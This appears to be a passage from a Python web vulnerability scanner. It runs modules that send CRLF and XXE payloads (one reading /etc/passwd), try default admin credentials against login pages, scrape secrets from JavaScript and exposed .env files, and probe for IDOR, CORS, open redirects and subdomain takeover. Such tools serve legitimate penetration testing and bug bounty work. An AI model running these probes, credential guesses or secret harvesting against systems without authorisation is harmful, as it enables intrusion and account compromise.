    for p in ("e4zyy%0d%0aSet-Cookie:e4zyy=1", "e4zyy%0aX-Injected:1"):
        r = point.fetch(ctx.client, p)
        if r is not None and any(h.lower() in ("set-cookie", "x-injected")
                                 for h in r.headers if "e4zyy" in r.headers.get(h, "")):
            ctx.report.add(Finding("injection", "CRLF / response header injection", "medium",
                                   point.url, point.method, point.param, p,
                                   "Injected header materialised.", dump_req(r), str(dict(r.headers)),
                                   "Strip CR/LF from header-bound values.", "", "firm"))
            break

    # XXE
    xxe = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
           '<r>&e;</r>')
    r = ctx.client.req(point.method if point.method != "GET" else "POST", point.url,
                       data=xxe, headers={"Content-Type": "application/xml"})
    if r is not None and "root:" in (r.text or ""):
        ctx.report.add(Finding("injection", "XXE (in-band file read)", "high",
                               point.url, "POST", point.param, "<!ENTITY e SYSTEM file:///etc/passwd>",
                               "root: line returned.", dump_req(r), snippet(r.text),
                               "Disable external entities in the XML parser.", "", "firm"))


def mod_misconfig(ctx, point):
    url = point.url
    r = ctx.client.get(url)
    if r is None:
        return
    hdr = {k.lower(): v for k, v in r.headers.items()}

    missing = [h for h in ("content-security-policy", "x-content-type-options",
                           "x-frame-options", "strict-transport-security",
                           "referrer-policy", "permissions-policy") if h not in hdr]
    if len(missing) >= 4:
        ctx.report.add(Finding("misconfig", "Security headers absent (%d)" % len(missing), "low",
                               url, "GET", "", "", "Missing: " + ", ".join(missing),
                               "", "", "Add the missing headers at the edge.", "", "firm"))

    # CORS
    for origin in ("https://e4zyy.test", "null"):
        r2 = ctx.client.get(url, headers={"Origin": origin})
        if r2 is None:
            continue
        acao = r2.headers.get("Access-Control-Allow-Origin", "")
        acac = r2.headers.get("Access-Control-Allow-Credentials", "")
        if acao == origin and acac.lower() == "true":
            ctx.report.add(Finding("misconfig", "CORS reflects origin with credentials", "medium",
                                   url, "GET", "", "Origin: %s" % origin,
                                   "ACAO=%s ACAC=%s" % (acao, acac), dump_req(r2), "",
                                   "Allowlist origins explicitly.", "Check a credentialed endpoint, not just the root.", "firm"))
            break
        if acao == "*" and acac.lower() == "true":
            ctx.report.add(Finding("misconfig", "CORS wildcard with credentials", "low",
                                   url, "GET", "", "Origin: %s" % origin,
                                   "ACAO=* ACAC=true (browser blocks unless reflected)", dump_req(r2), "",
                                   "Reflect origin instead of *.", "", "firm"))

    # cookie flags
    for sc in r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw, "headers") else []:
        low = sc.lower()
        name = sc.split("=")[0]
        issues = []
        if "httponly" not in low: issues.append("HttpOnly")
        if "secure" not in low: issues.append("Secure")
        if "samesite" not in low: issues.append("SameSite")
        if issues:
            ctx.report.add(Finding("misconfig", "Cookie missing flags (%s)" % name, "low",
                                   url, "GET", "", "", "Missing: " + ", ".join(issues),
                                   "", "", "Set HttpOnly; Secure; SameSite=Lax/Strict.", "", "firm"))

    # verbose errors
    r3 = ctx.client.get(set_qs(url, "e4zyy", "'\"%7B%7B%7D%7D%5B"))
    if r3 is not None:
        for pat in DEBUG_HINTS:
            m = re.search(pat, r3.text or "", re.I)
            if m:
                ctx.report.add(Finding("misconfig", "Verbose error / stack trace leak", "low",
                                       url, "GET", "e4zyy", "'\"{{}}[",
                                       "Matched: %s" % snippet(m.group(0), 80), dump_req(r3), snippet(r3.text),
                                       "Disable debug in production.", "", "firm"))
                break

    # method tampering / TRACE
    r4 = ctx.client.req("OPTIONS", url)
    if r4 is not None:
        allow = r4.headers.get("Allow", "")
        if "TRACE" in allow.upper():
            ctx.report.add(Finding("misconfig", "TRACE enabled", "info", url, "OPTIONS", "",
                                   "", "Allow: " + allow, "", "", "Disable TRACE.", "", "firm"))
        for m in ("PUT", "DELETE", "PATCH"):
            if m in allow.upper():
                ctx.report.queue("Method %s advertised on %s - test write access" % (m, url))


def mod_sensitive(ctx, base, urls):
    host = up.urlsplit(base).netloc
    for path in ("/.git/HEAD", "/.env", "/.svn/entries", "/.DS_Store", "/backup.zip",
                 "/backup.sql", "/db.sql", "/server-status", "/phpinfo.php", "/package.json",
                 "/composer.json", "/web.config", "/.well-known/security.txt"):
        r = ctx.client.get(base + path)
        if r is None:
            continue
        body = r.text or ""
        if r.status_code == 200 and len(body) > 12:
            sev = "medium" if path in ("/.git/HEAD", "/.env", "/backup.sql", "/backup.zip", "/db.sql") else "low"
            ctx.report.add(Finding("sensitive", "Exposed %s" % path, sev, base + path, "GET", "",
                                   "", "%dB, status 200" % len(body), dump_req(r), snippet(body),
                                   "Block or relocate; rotate any contained secrets.", "", "firm"))
            if path == "/.env":
                for name, rx in SECRET_RX.items():
                    if re.search(rx, body):
                        ctx.report.queue("Secret type '%s' in .env - validate scope" % name)

    # JS / source maps
    scanned = 0
    for u in urls:
        if scanned >= 40:
            break
        if not re.search(r"\.js(\?|$)", u):
            continue
        scanned += 1
        r = ctx.client.get(u)
        if r is None:
            continue
        body = r.text or ""
        for name, rx in SECRET_RX.items():
            m = re.search(rx, body)
            if m:
                sev = "high" if name in ("AWS secret key", "Private key block", "Stripe secret") else "medium"
                ctx.report.add(Finding("sensitive", "Potential %s in JS bundle" % name, sev,
                                       u, "GET", "", "", snippet(m.group(0), 90), "", "",
                                       "Move server-side; rotate.",
                                       "VALIDATE the key with a real API call before submitting.", "tentative"))
        if "sourceMappingURL=" in body:
            ctx.report.queue("Source map referenced: %s" % u)


def mod_access(ctx, base, urls):
    host = up.urlsplit(base).netloc
    for p in FORCED_PATHS:
        r = ctx.client.get(base + p, allow_redirects=False)
        if r is None:
            continue
        if r.status_code == 200 and len(r.text or "") > 60:
            ctx.report.queue("Reachable %s (200, %dB) - check authz" % (p, len(r.text)))
            if any(k in p for k in ("admin", "console", "actuator", "debug")):
                ctx.report.add(Finding("access", "Admin/debug surface exposed: %s" % p, "medium",
                                       base + p, "GET", "", "", "Status 200 without auth",
                                       dump_req(r), snippet(r.text),
                                       "Restrict by IP or auth.", "Verify unauthenticated access from a clean session.", "firm"))

    # IDOR probe on numeric params
    for u in urls[:60]:
        qs = up.parse_qsl(up.urlsplit(u).query, keep_blank_values=True)
        for k, v in qs:
            if not v.isdigit():
                continue
            r0 = ctx.client.get(u)
            if r0 is None:
                continue
            n = str(int(v) + 1)
            r1 = ctx.client.get(set_qs(u, k, n))
            if r1 is None:
                continue
            if r1.status_code == 200 and abs(len(r1.text or "") - len(r0.text or "")) > 60:
                if (r1.text or "")[:200] != (r0.text or "")[:200]:
                    ctx.report.queue("IDOR candidate %s=%s -> %s (len %d->%d)" %
                                     (k, v, n, len(r0.text or ""), len(r1.text or "")))


def mod_auth(ctx, base):
    # user enumeration on login / forgot
    for path in ("/login", "/signin", "/api/login", "/api/auth/login", "/forgot-password",
                 "/api/auth/forgot-password", "/register", "/signup"):
        u = base + path
        r = ctx.client.get(u)
        if r is None or r.status_code >= 400:
            continue
        ctx.report.queue("Auth endpoint present: %s" % u)

    # default creds on discovered admin panels
    creds = [("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
             ("administrator", "administrator"), ("root", "root"), ("test", "test")]
    for path in ("/admin", "/administrator", "/wp-admin/", "/login"):
        u = base + path
        r = ctx.client.get(u)
        if r is None or r.status_code >= 400:
            continue
        for user, pw in creds:
            for ctype, payload in (
                ({"Content-Type": "application/x-www-form-urlencoded"},
                 {"username": user, "password": pw, "user": user, "pass": pw, "log": user, "pwd": pw}),
                ({"Content-Type": "application/json"}, {"username": user, "password": pw}),
            ):
                if "json" in ctype["Content-Type"]:
                    rr = ctx.client.req("POST", u, json_body=payload, headers=ctype, allow_redirects=False)
                else:
                    rr = ctx.client.req("POST", u, data=payload, headers=ctype, allow_redirects=False)
                if rr is None:
                    continue
                if rr.status_code in (301, 302, 303) and "logout" not in (rr.text or "").lower():
                    loc = rr.headers.get("Location", "")
                    if any(x in loc.lower() for x in ("dash", "admin", "home", "panel")):
                        ctx.report.add(Finding("auth", "Default credentials accepted", "high",
                                               u, "POST", "", "%s:%s" % (user, pw),
                                               "Redirect to %s" % loc, dump_req(rr), "",
                                               "Force password change on first login.",
                                               "Confirm the session is privileged, not just a redirect.", "tentative"))
                        break

    # JWT inspection
    r = ctx.client.get(base)
    if r is not None:
        for sc in (r.headers.get("Set-Cookie", "") or "").split(";"):
            m = re.search(r"(eyJ[\w-]+\.[\w-]+\.[\w-]*)", sc)
            if not m:
                continue
            tok = m.group(1)
            try:
                head = json.loads(base64.urlsafe_b64decode(tok.split(".")[0] + "=="))
                pl = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
            except Exception:
                continue
            ctx.report.queue("JWT found: alg=%s keys=%s" % (head.get("alg"), list(pl)))
            if head.get("alg", "").lower() == "none":
                ctx.report.add(Finding("auth", "JWT alg=none accepted", "high", base, "GET", "",
                                       "", "alg none", "", "", "Enforce alg allowlist.", "", "tentative"))
            if "exp" not in pl:
                ctx.report.queue("JWT without exp claim")


def mod_csrf(ctx, base, forms):
    for f in forms:
        if f["method"] != "post":
            continue
        names = [k.lower() for k in f["params"]]
        if not any(x in names for x in ("csrf", "token", "_token", "authenticity_token", "csrfmiddlewaretoken")):
            ctx.report.add(Finding("csrf", "POST form without anti-CSRF token", "low",
                                   f["action"], "POST", "", "",
                                   "Fields: " + ", ".join(names)[:160], "", "",
                                   "Add per-session CSRF token; SameSite=Lax.",
                                   "Confirm the form is state-changing and cookie-authenticated.", "tentative"))


def mod_open_redirect(ctx, point):
    if not re.search(r"(url|redirect|next|return|dest|continue|ref|callback|target)", point.param, re.I):
        return
    b = baseline(ctx.client, point)
    if b is None:
        return
    for p in ("//e4zyy.test", "https://e4zyy.test", "/\\e4zyy.test", "//e4zyy.test/%2f.."):
        r = point.fetch(ctx.client, p, headers={"Referer": "https://e4zyy.test/"})
        if r is None:
            continue
        if r.url and "e4zyy.test" in up.urlsplit(r.url).netloc:
            ctx.report.add(Finding("injection", "Open redirect", "low", point.url, point.method,
                                   point.param, p, "Landed on %s" % r.url, dump_req(r), "",
                                   "Allowlist redirect targets.", "", "firm"))
            return


def mod_host_header(ctx, base):
    r = ctx.client.get(base, headers={"Host": "e4zyy.test"}, allow_redirects=False)
    if r is not None and "e4zyy.test" in (r.text or ""):
        ctx.report.add(Finding("injection", "Host header reflected (poisoning candidate)", "medium",
                               base, "GET", "", "Host: e4zyy.test",
                               "Attacker host echoed in body", dump_req(r), snippet(r.text),
                               "Use absolute configured host in links.",
                               "Test against password-reset to weaponise.", "tentative"))


# --------------------------------------------------------------------------- #
#  Passive subdomain takeover
# --------------------------------------------------------------------------- #

def crt_subs(domain):
    out = set()
    try:
        r = requests.get("https://crt.sh/?q=%25.%s&output=json" % domain, timeout=25,
                         headers={"User-Agent": _rng.choice(UAS)})
        for row in r.json():
            for n in row.get("name_value", "").splitlines():
                n = n.strip().lstrip("*.").lower()
                if n.endswith(domain):
                    out.add(n)
    except Exception:
        pass
    return sorted(out)


def mod_takeover(ctx, domain):
    subs = crt_subs(domain)
    ctx.report.note("crt.sh returned %d subdomains for %s" % (len(subs), domain))
    for sub in subs[:400]:
        try:
            cname = socket.gethostbyname_ex(sub)[0] if False else None
        except Exception:
            cname = None
        try:
            import subprocess
            res = subprocess.run(["dig", "+short", "CNAME", sub], capture_output=True, text=True, timeout=8)
            cname = res.stdout.strip().splitlines()[0].rstrip(".") if res.stdout.strip() else None
        except Exception:
            cname = None
        target = cname or sub
        for svc, (rx, body_rx) in TAKEOVER_FP.items():
            if not re.search(rx, target):
                continue
            r = ctx.client.get("https://" + sub, allow_redirects=True)
            if r is None:
                continue
            m = re.search(body_rx, r.text or "", re.I)
            if m:
                ctx.report.add(Finding("takeover", "Subdomain takeover candidate (%s) - passive" % svc,
                                       "medium", "https://" + sub, "GET", "",
                                       "CNAME %s -> %s" % (sub, target),
                                       "Provider unclaimed signature: %s" % snippet(m.group(0), 80),
                                       "", snippet(r.text),
                                       "Claim the resource or remove the DNS record.",
                                       "PASSIVE ONLY - resource not registered. Screenshot the provider error page.", "tentative"))


# --------------------------------------------------------------------------- #
#  Orchestrator
# --------------------------------------------------------------------------- #

@dataclass
class Ctx:
    cfg: Cfg
    client: Client
    report: Report


MODULES = {
    "sqli":       "SQL injection, all bypass styles",
    "xss":        "Reflected/DOM XSS",
    "injection":  "SSTI, command, LDAP, CRLF, XXE, open redirect",
    "misconfig":  "headers, CORS, cookies, verbose errors, methods",
    "access":     "forced browse, IDOR candidates",
}


def run_module(ctx, name, fn, points):
    if not points:
        return
    print("\n[*] %s (%d points)" % (MODULES.get(name, name), len(points)))
    with ThreadPoolExecutor(max_workers=ctx.cfg.threads) as ex:
        futs = {ex.submit(fn, ctx, p): p for p in points}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception as e:
                if not ctx.cfg.quiet:
                    print("    ! %s" % e)


def main():
    ap = argparse.ArgumentParser(description="All In One Bug Scanner - coded by e4zyy | NOEL BUNSIAU")
    ap.add_argument("-u", "--url", help="target URL or host")
    ap.add_argument("--cookie", default="")
    ap.add_argument("-H", "--header", action="append", default=[], help="Name: Value")
    ap.add_argument("--proxy")
    ap.add_argument("-t", "--threads", type=int, default=8)
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--depth", type=int, default=2)
    ap.add_argument("--max-urls", type=int, default=220)
    ap.add_argument("--variants", type=int, default=12, help="max mutated payloads per probe")
    ap.add_argument("--sleep", type=int, default=5, help="time-based delay seconds")
    ap.add_argument("--subdomains", action="store_true", help="passive takeover pass (crt.sh)")
    ap.add_argument("--only", help="comma list: sqli,xss,injection,misconfig,access")
    ap.add_argument("--skip", default="")
    ap.add_argument("-o", "--outdir", default="reports")
    ap.add_argument("--insecure", action="store_true", default=True)
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--list-modules", action="store_true")
    a = ap.parse_args()

    print(BANNER)
    if a.list_modules:
        for k, v in MODULES.items():
            print("  %-11s %s" % (k, v))
        print("  auth        endpoints, default creds, JWT")
        print("  csrf        token-less state-changing forms")
        print("  sensitive   .git/.env/backups, secrets in JS")
        print("  takeover    passive subdomain takeover")
        return
    if not a.url:
        ap.error("-u/--url required")

    base = normalize(a.url)
    cfg = Cfg(timeout=a.timeout, delay=a.delay, threads=a.threads, depth=a.depth,
              max_urls=a.max_urls, cookie=a.cookie, variants=a.variants, sleep=a.sleep,
              quiet=a.quiet, subdomains=a.subdomains, proxy=a.proxy)
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            cfg.headers[k.strip()] = v.strip()

    client = Client(cfg)
    report = Report(a.outdir)
    ctx = Ctx(cfg, client, report)

    print("[*] Target: %s" % base)
    r = client.get(base)
    if r is None:
        sys.exit("[!] unreachable")
    print("[*] Reachable: HTTP %d, %dB" % (r.status_code, len(r.content)))

    detect_waf(client, base, report)
    urls, forms = crawl(client, base, cfg, report)
    points = build_points(urls, forms)
    print("[*] Injection points: %d" % len(points))
    report.note("Points discovered: %d" % len(points))

    only = [x.strip() for x in a.only.split(",")] if a.only else None
    skip = [x.strip() for x in a.skip.split(",") if x.strip()]

    def wanted(n):
        return (only is None or n in only) and n not in skip

    if wanted("sqli"):
        run_module(ctx, "sqli", mod_sqli, points)
    if wanted("xss"):
        run_module(ctx, "xss", mod_xss, points)
    if wanted("injection"):
        run_module(ctx, "injection", mod_injection, points)
        run_module(ctx, "injection", mod_open_redirect, points)
    if wanted("misconfig"):
        run_module(ctx, "misconfig", mod_misconfig, points[:40])
        mod_host_header(ctx, base)
    if wanted("access"):
        mod_access(ctx, base, urls)
    if wanted("sensitive"):
        mod_sensitive(ctx, base, urls)
    if wanted("auth"):
        mod_auth(ctx, base)
    if wanted("csrf"):
        mod_csrf(ctx, base, forms)
    if cfg.subdomains:
        print("\n[*] Passive subdomain takeover")
        mod_takeover(ctx, up.urlsplit(base).netloc.split(":")[0])

    path, jpath = report.write(base)
    v = report.verdict()
    print("\n" + "=" * 60)
    print("VERDICT: %s   (%d findings)" % (v, len(report.findings)))
    if report.audit_queue:
        print("Audit queue: %d items" % len(report.audit_queue))
    print("TXT : %s" % path)
    print("JSON: %s" % jpath)
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
